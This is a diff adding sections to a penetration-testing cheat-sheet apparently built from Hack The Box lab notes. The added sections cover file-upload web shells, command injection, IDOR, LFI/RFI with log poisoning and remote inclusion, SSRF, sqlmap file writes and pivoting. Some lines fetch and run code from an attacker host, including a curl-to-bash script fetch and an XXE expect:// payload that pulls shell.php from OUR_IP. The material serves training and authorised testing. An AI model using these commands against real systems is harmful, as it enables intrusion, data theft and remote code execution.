+curl -sS -F 'uploadFile=@proof.php;type=application/x-httpd-php' "$BASE/upload.php"
+curl -sS "$BASE/uploads/ACTUAL_STORED_NAME.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Establish server-side execution in stages](/web/file-upload#establish-server-side-execution-in-stages)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**File Upload Attacks**
+
+```bash
+curl -sS -G --data-urlencode 'cmd=id' "$BASE/uploads/ACTUAL_STORED_NAME.php"
+curl -sS -G --data-urlencode 'cmd=pwd' "$BASE/uploads/ACTUAL_STORED_NAME.php"
+curl -sS -G --data-urlencode 'cmd=ls -la' "$BASE/uploads/ACTUAL_STORED_NAME.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Establish server-side execution in stages](/web/file-upload#establish-server-side-execution-in-stages)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Test actual bytes and image processing">
+
+### Test actual bytes and image processing
+
+**File Upload Attacks**
+
+```bash
+exiftool sample.png
+sha256sum sample.png
+curl -sS "$BASE/uploads/ACTUAL_STORED_NAME.png" -o retrieved.png
+file retrieved.png
+exiftool retrieved.png
+sha256sum retrieved.png
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Test actual bytes and image processing](/web/file-upload#test-actual-bytes-and-image-processing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Test filename and header handling separately">
+
+### Test filename and header handling separately
+
+**File Upload Attacks**
+
+```bash
+curl -sS -F 'uploadFile=@sample.png;filename=probe.php;type=image/png' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.pHp;type=image/png' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.php.jpg;type=image/png' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.jpg.php;type=image/png' "$BASE/upload.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Test filename and header handling separately](/web/file-upload#test-filename-and-header-handling-separately)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**File Upload Attacks**
+
+```bash
+curl -sS -F 'uploadFile=@sample.png;filename=probe.png;type=application/octet-stream' "$BASE/upload.php"
+curl -sS -F 'uploadFile=@sample.png;filename=probe.png;type=image/jpeg' "$BASE/upload.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Upload Attacks — Test filename and header handling separately](/web/file-upload#test-filename-and-header-handling-separately)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -838,6 +1332,210 @@ curl http://10.129.96.84/
 
 </Accordion>
 
+<Accordion title="Bypassing a filter by moving the parameter">
+
+### Bypassing a filter by moving the parameter
+
+**HTTP Verb Tampering**
+
+```bash
+# Compare one ordinary filename first.
+curl -sS -G --data-urlencode 'filename=notes-test.txt' "$BASE/index.php"
+curl -sS --data-urlencode 'filename=notes-test.txt' "$BASE/index.php"
+
+# Then compare a distinctive value that previously triggered the lab filter.
+curl -sS -G --data-urlencode 'filename=probe;' "$BASE/index.php"
+curl -sS --data-urlencode 'filename=probe;' "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTTP Verb Tampering — Bypassing a filter by moving the parameter](/web/verb-tampering#bypassing-a-filter-by-moving-the-parameter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**HTTP Verb Tampering**
+
+```bash
+curl -sS --data-urlencode 'filename=verb-proof-a; touch verb-proof-b;' "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTTP Verb Tampering — Bypassing a filter by moving the parameter](/web/verb-tampering#bypassing-a-filter-by-moving-the-parameter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Establish a baseline and compare methods">
+
+### Establish a baseline and compare methods
+
+**HTTP Verb Tampering**
+
+```bash
+BASE='http://TARGET:PORT'
+ENDPOINT='/admin/status.php'  # Replace with an observed route.
+mkdir -p evidence/verbs
+curl -sS -D evidence/verbs/get.headers -o evidence/verbs/get.body "$BASE$ENDPOINT"
+curl -sS -X OPTIONS -D evidence/verbs/options.headers \
+  -o evidence/verbs/options.body "$BASE$ENDPOINT"
+curl -sS -I "$BASE$ENDPOINT" > evidence/verbs/head.headers
+curl -sS --data '' -D evidence/verbs/post.headers \
+  -o evidence/verbs/post.body "$BASE$ENDPOINT"
+rg -n 'HTTP/|Allow:|WWW-Authenticate:|Location:|Content-Length:' evidence/verbs/*.headers
+wc -c evidence/verbs/*.body
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTTP Verb Tampering — Establish a baseline and compare methods](/web/verb-tampering#establish-a-baseline-and-compare-methods)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="OPTIONS did not list methods — but it executed the action">
+
+### OPTIONS did not list methods — but it executed the action
+
+**HTTP Verb Tampering**
+
+```bash
+# This action resets the disposable HTB exercise. It is not a discovery probe.
+curl -sS -X OPTIONS -D reset.headers -o reset.body "$BASE/admin/reset.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTTP Verb Tampering — OPTIONS did not list methods — but it executed the action](/web/verb-tampering#options-did-not-list-methods-—-but-it-executed-the-action)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Encoded and hashed object references">
+
+### Encoded and hashed object references
+
+**IDOR and API Authorization**
+
+```bash
+CONTRACT=$(printf %s "$B_ID" | base64 -w 0 | md5sum | cut -d ' ' -f1)
+curl -sS -b "PHPSESSID=$SESSION_A" --data-urlencode "contract=$CONTRACT" \
+  -D evidence/idor/contract.headers -o evidence/idor/contract.bin "$BASE/download.php"
+file evidence/idor/contract.bin
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Encoded and hashed object references](/web/idor#encoded-and-hashed-object-references)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Read access can provide prerequisites for a write">
+
+### Read access can provide prerequisites for a write
+
+**IDOR and API Authorization**
+
+```bash
+# Controlled B account only: start from its real baseline, preserving required fields.
+jq '.full_name = "IDOR verification marker"' evidence/idor/other.json > evidence/idor/update.json
+curl -sS -b "PHPSESSID=$SESSION_A" -X PUT -H 'Content-Type: application/json' \
+  --data-binary @evidence/idor/update.json "$BASE/profile/api.php/profile/$B_ID"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Read access can provide prerequisites for a write](/web/idor#read-access-can-provide-prerequisites-for-a-write)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Scrambled ffuf response bodies">
+
+### Scrambled ffuf response bodies
+
+**IDOR and API Authorization**
+
+```bash
+# Replay one result with automatic decoding; do not feed headers into jq.
+curl -sS --compressed -b "PHPSESSID=$SESSION_A" \
+  "$BASE/api.php/user/$B_ID" -o evidence/idor/replayed.json
+jq . evidence/idor/replayed.json
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Scrambled ffuf response bodies](/web/idor#scrambled-ffuf-response-bodies)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Token ownership and reset requests">
+
+### Token ownership and reset requests
+
+**IDOR and API Authorization**
+
+```bash
+curl -sS --compressed -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  "$BASE/api.php/token/$B_ID" -o evidence/idor/token.json
+TOKEN=$(jq -er '.token | select(type == "string" and length > 0)' evidence/idor/token.json)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Token ownership and reset requests](/web/idor#token-ownership-and-reset-requests)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Two-account comparison matrix">
+
+### Two-account comparison matrix
+
+**IDOR and API Authorization**
+
+```bash
+BASE='http://TARGET:PORT'
+SESSION_A='REPLACE_WITH_ACCOUNT_A_SESSION'
+A_ID=74
+B_ID=75
+mkdir -p evidence/idor
+curl -sS --compressed -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  "$BASE/api.php/user/$A_ID" -o evidence/idor/own.json
+curl -sS --compressed -b "PHPSESSID=$SESSION_A; uid=$A_ID" \
+  "$BASE/api.php/user/$B_ID" -o evidence/idor/other.json
+jq . evidence/idor/own.json
+jq . evidence/idor/other.json
+diff -u evidence/idor/own.json evidence/idor/other.json
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [IDOR and API Authorization — Two-account comparison matrix](/web/idor#two-account-comparison-matrix)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="6. Networking / pentest quick commands">
 
 ### 6. Networking / pentest quick commands
@@ -860,6 +1558,252 @@ python3 -m http.server 80            # quick web server to transfer files
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Kali Terminal, tmux, zsh, and Vim — 6. Networking / pentest quick commands](/cheatsheets/terminal-tmux-zsh-cheatsheet#6-networking-/-pentest-quick-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Basic read and traversal checks">
+
+### Basic read and traversal checks
+
+**LFI / RFI**
+
+```bash
+curl -sS -G --data-urlencode 'language=/etc/passwd' "$BASE/index.php"
+curl -sS -G --data-urlencode 'language=../../../../etc/passwd' "$BASE/index.php"
+curl -sS -G --data-urlencode 'language=C:/Windows/win.ini' "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Basic read and traversal checks](/web/lfi-rfi#basic-read-and-traversal-checks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Log or session inclusion">
+
+### Log or session inclusion
+
+**LFI / RFI**
+
+```bash
+# First identify a fixed marker in the readable access log.
+curl -sS -A 'lfi-log-marker-01' "$BASE/"
+curl -sS -G --data-urlencode 'language=/var/log/apache2/access.log' "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Log or session inclusion](/web/lfi-rfi#log-or-session-inclusion)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**LFI / RFI**
+
+```bash
+curl -sS -A '<?php echo "log-include-proof"; ?>' "$BASE/"
+curl -sS -G --data-urlencode 'language=/var/log/apache2/access.log' "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Log or session inclusion](/web/lfi-rfi#log-or-session-inclusion)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Map the file operation">
+
+### Map the file operation
+
+**LFI / RFI**
+
+```bash
+BASE='http://app.htb'
+curl -sS -G --data-urlencode 'language=en.php' "$BASE/index.php"
+curl -sS -G --data-urlencode 'language=missing-note.php' "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Map the file operation](/web/lfi-rfi#map-the-file-operation)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="PHP wrapper branches and their prerequisites">
+
+### PHP wrapper branches and their prerequisites
+
+**LFI / RFI**
+
+```bash
+curl -sS -X POST --data-binary '<?php echo "input-proof"; ?>' \
+  "$BASE/index.php?language=php://input"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — PHP wrapper branches and their prerequisites](/web/lfi-rfi#php-wrapper-branches-and-their-prerequisites)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Read PHP source without executing it">
+
+### Read PHP source without executing it
+
+**LFI / RFI**
+
+```bash
+curl -sS -G \
+  --data-urlencode 'language=php://filter/read=convert.base64-encode/resource=config.php' \
+  "$BASE/index.php" -o config-response.html
+
+# Copy only the returned base64 value into config.b64, then decode it locally.
+base64 -d config.b64 > config.php.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Read PHP source without executing it](/web/lfi-rfi#read-php-source-without-executing-it)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Remote inclusion">
+
+### Remote inclusion
+
+**LFI / RFI**
+
+```bash
+curl -sS -G \
+  --data-urlencode 'language=http://10.10.14.10:8000/proof.php' "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Remote inclusion](/web/lfi-rfi#remote-inclusion)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Test the specific path restriction">
+
+### Test the specific path restriction
+
+**LFI / RFI**
+
+```bash
+curl --path-as-is -sS "$BASE/index.php?language=..%2f..%2f..%2fetc%2fpasswd"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Test the specific path restriction](/web/lfi-rfi#test-the-specific-path-restriction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Upload plus inclusion">
+
+### Upload plus inclusion
+
+**LFI / RFI**
+
+```bash
+curl -sS -G \
+  --data-urlencode 'language=./profile_images/include-proof.gif' \
+  "$BASE/index.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — Upload plus inclusion](/web/lfi-rfi#upload-plus-inclusion)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Names and application layer">
+
+### Names and application layer
+
+**Layers of Enumeration: Visual Reference**
+
+```bash
+dig @DNS_IP DOMAIN_FQDN SOA
+dig @DNS_IP DOMAIN_FQDN MX
+curl -I http://TARGET_IP/
+curl -H 'Host: APP_FQDN' http://TARGET_IP/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Layers of Enumeration: Visual Reference — Names and application layer](/recon/layers-enumeration#names-and-application-layer)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Test an application before enumerating broadly">
+
+### Test an application before enumerating broadly
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+curl -I http://INTERNAL_IP/
+nmap -sT -Pn -n -p 80,445 INTERNAL_IP
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng: Quick Reference — Test an application before enumerating broadly](/pivoting/ligolo#test-an-application-before-enumerating-broadly)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Automated Linux local enumeration script">
+
+### Automated Linux local enumeration script
+
+**LinEnum: Script Bookmark**
+
+```bash
+# On Kali: host LinEnum.sh
+python3 -m http.server 8000
+
+# On target: run in memory or from /tmp and save output
+curl -s http://LHOST:8000/LinEnum.sh | bash -s -- -t > /tmp/linenum.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LinEnum: Script Bookmark — Automated Linux local enumeration script](/enumeration/linenum#automated-linux-local-enumeration-script)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -921,7 +1865,7 @@ curl http://<IP>/testing.txt                                  # verify
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Oracle Database and TNS Enumeration — Example 2: Post-exploitation → RCE (ODAT)](/enumeration/oracle-tns-rdbms-cheat-sheet#example-2-post-exploitation-→-rce-odat) · [Oracle Database and TNS Enumeration — Post-exploitation → RCE (ODAT)](/enumeration/oracle-tns-rdbms-cheat-sheet#post-exploitation-→-rce-odat)
+**Original note sections:** [Oracle Database and TNS Enumeration — Post-exploitation → RCE (ODAT)](/enumeration/oracle-tns-rdbms-cheat-sheet#post-exploitation-→-rce-odat)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -945,6 +1889,63 @@ curl -s --max-time 8 -o /dev/null -w "HTTP %{http_code}\n" http://10.129.234.172
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Step 0 — confirm the relay target exists](/password-attacks/pass-the-certificate#step-0-—-confirm-the-relay-target-exists)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Add SOCKS only when you need multiple destinations">
+
+### Add SOCKS only when you need multiple destinations
+
+**Pivoting Fundamentals: Routes, SOCKS, and Forwards**
+
+```bash
+ssh -N -D 127.0.0.1:1080 USERNAME@PIVOT_IP
+# Configure a dedicated proxychains file with:
+# socks5 127.0.0.1 1080
+proxychains -f ./proxychains-lab.conf curl http://INTERNAL_IP/
+proxychains -f ./proxychains-lab.conf nmap -sT -Pn -n -p 80,445 INTERNAL_IP
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting Fundamentals: Routes, SOCKS, and Forwards — Add SOCKS only when you need multiple destinations](/pivoting/fundamentals#add-socks-only-when-you-need-multiple-destinations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Verify a single SSH forward">
+
+### Verify a single SSH forward
+
+**Pivoting Fundamentals: Routes, SOCKS, and Forwards**
+
+```bash
+# Run on your workstation. PIVOT_IP is the SSH endpoint.
+ssh -N -L 127.0.0.1:8081:INTERNAL_IP:80 USERNAME@PIVOT_IP
+curl -I http://127.0.0.1:8081/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting Fundamentals: Routes, SOCKS, and Forwards — Verify a single SSH forward](/pivoting/fundamentals#verify-a-single-ssh-forward)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Pivoting Fundamentals: Routes, SOCKS, and Forwards**
+
+```bash
+curl -H 'Host: INTERNAL_FQDN' http://127.0.0.1:8081/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting Fundamentals: Routes, SOCKS, and Forwards — Verify a single SSH forward](/pivoting/fundamentals#verify-a-single-ssh-forward)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1038,11 +2039,181 @@ Web server     → wget / curl
 
 </Accordion>
 
-<Accordion title="Server-Side Request Forgery: Quick Reference">
+<Accordion title="Establish execution and network context">
 
-### Server-Side Request Forgery: Quick Reference
+### Establish execution and network context
 
-**Server-Side Request Forgery: Quick Reference**
+**Reverse Shell Generators and References**
+
+```bash
+# Linux target:
+id
+uname -a
+command -v bash python3 nc curl
+ip route
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Reverse Shell Generators and References — Establish execution and network context](/exploitation/reverse-shell#establish-execution-and-network-context)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Preserve the request and compare responses">
+
+### Preserve the request and compare responses
+
+**SQL Injection**
+
+```bash
+BASE='http://app.htb'
+curl -sS -G --data-urlencode 'port_code=cn' \
+  "$BASE/search.php" -o baseline.html
+curl -sS -G --data-urlencode "port_code=cn'" \
+  "$BASE/search.php" -o quote.html
+diff -u baseline.html quote.html
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection — Preserve the request and compare responses](/web/sqli#preserve-the-request-and-compare-responses)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Prove write access before assuming execution">
+
+### Prove write access before assuming execution
+
+**SQL Injection**
+
+```bash
+curl -sS "$BASE/sql-proof.txt"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection — Prove write access before assuming execution](/web/sqli#prove-write-access-before-assuming-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="File and operating-system operations">
+
+### File and operating-system operations
+
+**SQLMap**
+
+```bash
+sqlmap -r request.txt -p id --file-read='/etc/passwd'
+printf '%s\n' 'sqlmap-write-proof' > sqlmap-proof.txt
+sqlmap -r request.txt -p id --file-write='sqlmap-proof.txt' \
+  --file-dest='/var/www/html/sqlmap-proof.txt'
+curl -sS 'http://app.htb/sqlmap-proof.txt'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap — File and operating-system operations](/web/sqlmap#file-and-operating-system-operations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Writing Local Files">
+
+### Writing Local Files
+
+**SQLMap Essentials — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
+
+total 148
+drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
+drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
+-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Writing Local Files](/web/htb/sqlmap-essentials#writing-local-files)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Baseline and a uniquely identifiable request">
+
+### Baseline and a uniquely identifiable request
+
+**SSRF (Server-Side Request Forgery)**
+
+```bash
+BASE='http://app.htb'
+curl -sS --data-urlencode 'url=http://known-lab-service/' "$BASE/fetch.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SSRF (Server-Side Request Forgery) — Baseline and a uniquely identifiable request](/web/ssrf#baseline-and-a-uniquely-identifiable-request)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SSRF (Server-Side Request Forgery)**
+
+```bash
+curl -sS --data-urlencode 'url=http://10.10.14.10:8000/ssrf-proof-01' \
+  "$BASE/fetch.php"
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SSRF (Server-Side Request Forgery) — Baseline and a uniquely identifiable request](/web/ssrf#baseline-and-a-uniquely-identifiable-request)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Check a specific internal-service hypothesis">
+
+### Check a specific internal-service hypothesis
+
+**SSRF (Server-Side Request Forgery)**
+
+```bash
+curl -sS --data-urlencode 'url=http://127.0.0.1:8080/' "$BASE/fetch.php" -o local-service.html
+curl -sS --data-urlencode 'url=http://127.0.0.1:8080/nonexistent-proof-01' \
+  "$BASE/fetch.php" -o local-missing.html
+diff -u local-service.html local-missing.html
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SSRF (Server-Side Request Forgery) — Check a specific internal-service hypothesis](/web/ssrf#check-a-specific-internal-service-hypothesis)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Record the demonstrated boundary">
+
+### Record the demonstrated boundary
+
+**SSRF (Server-Side Request Forgery)**
 
 ```bash
 # point a URL parameter at internal targets
@@ -1054,7 +2225,87 @@ for p in 22 80 3306 6379 8080; do curl -s "http://$IP/fetch?url=http://127.0.0.1
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [SSRF (Server-Side Request Forgery) — Earlier notebook reference](/web/ssrf#earlier-notebook-reference)
+**Original note sections:** [SSRF (Server-Side Request Forgery) — Record the demonstrated boundary](/web/ssrf#record-the-demonstrated-boundary)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="2. Confirm the destination from the pivot itself">
+
+### 2. Confirm the destination from the pivot itself
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```bash
+curl -sS -D - -o /tmp/service-baseline.body http://127.0.0.1:8080/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — 2. Confirm the destination from the pivot itself](/pivoting/methodology#2-confirm-the-destination-from-the-pivot-itself)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="A single service through SSH local forwarding">
+
+### A single service through SSH local forwarding
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```bash
+# In another workstation terminal:
+curl -sS -D - http://127.0.0.1:8080/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — A single service through SSH local forwarding](/pivoting/methodology#a-single-service-through-ssh-local-forwarding)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="SOCKS for compatible client connections">
+
+### SOCKS for compatible client connections
+
+**Systems & Pivoting: Enumeration Methodology**
+
+```bash
+curl --socks5-hostname 127.0.0.1:9050 -sS http://internal.lab.htb/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — SOCKS for compatible client connections](/pivoting/methodology#socks-for-compatible-client-connections)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Configure Listener &amp; FoxyProxy">
+
+### Configure Listener & FoxyProxy
+
+**Using Web Proxies (Burp Suite & OWASP ZAP)**
+
+```bash
+# Route curl / ffuf / sqlmap through Burp (127.0.0.1:8080)
+curl -sk -x http://127.0.0.1:8080 https://TARGET_IP/
+ffuf -w WORDLIST -u http://TARGET_IP/FUZZ -x http://127.0.0.1:8080
+sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Using Web Proxies (Burp Suite & OWASP ZAP) — Configure Listener & FoxyProxy](/web/web-proxies#configure-listener-&-foxyproxy)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1083,11 +2334,194 @@ sudo docker compose up -d
 
 </Accordion>
 
-<Accordion title="Web Enumeration: Quick Commands">
+<Accordion title="Mass Enumeration">
 
-### Web Enumeration: Quick Commands
+### Mass Enumeration
 
-**Web Enumeration: Quick Commands**
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
+
+<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
+<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Attacks — HTB Module**
+
+```text
+grcic550@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
+
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Attacks — HTB Module**
+
+```bash
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**Web Attacks — HTB Module**
+
+```bash
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Mass Enumeration](/web/htb/web-attacks#mass-enumeration-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Remote Code Execution with XXE">
+
+### Remote Code Execution with XXE
+
+**Web Attacks — HTB Module**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Web Attacks — HTB Module — Remote Code Execution with XXE](/web/htb/web-attacks#remote-code-execution-with-xxe)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="3. Correct the token format, then compare the reset method">
+
+### 3. Correct the token format, then compare the reset method
+
+**Web Attacks: Assessment Learning Notes**
+
+```bash
+BASE='http://TARGET:PORT'
+SESSION_A='REPLACE_WITH_CURRENT_SESSION'
+A_ID=74
+TARGET_ID=75
+NEW_LAB_PASSWORD='REPLACE_WITH_TEMPORARY_LAB_PASSWORD'
